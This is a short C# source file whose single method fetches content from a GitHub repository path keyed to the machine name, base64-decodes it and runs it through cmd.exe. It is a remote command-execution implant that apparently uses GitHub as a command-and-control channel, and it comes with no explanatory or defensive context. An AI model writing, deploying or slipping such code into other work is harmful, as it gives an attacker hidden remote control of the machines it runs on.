using System; using System.Net; using System.Diagnostics;
class Command {
 void Run() {
 string url = "https://api.github.com/repos/team/tasks/contents/" + Environment.MachineName;
 string body = new WebClient().DownloadString(url);
 string command = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(body));
 Process.Start("cmd.exe", "/c " + command);
 }
}
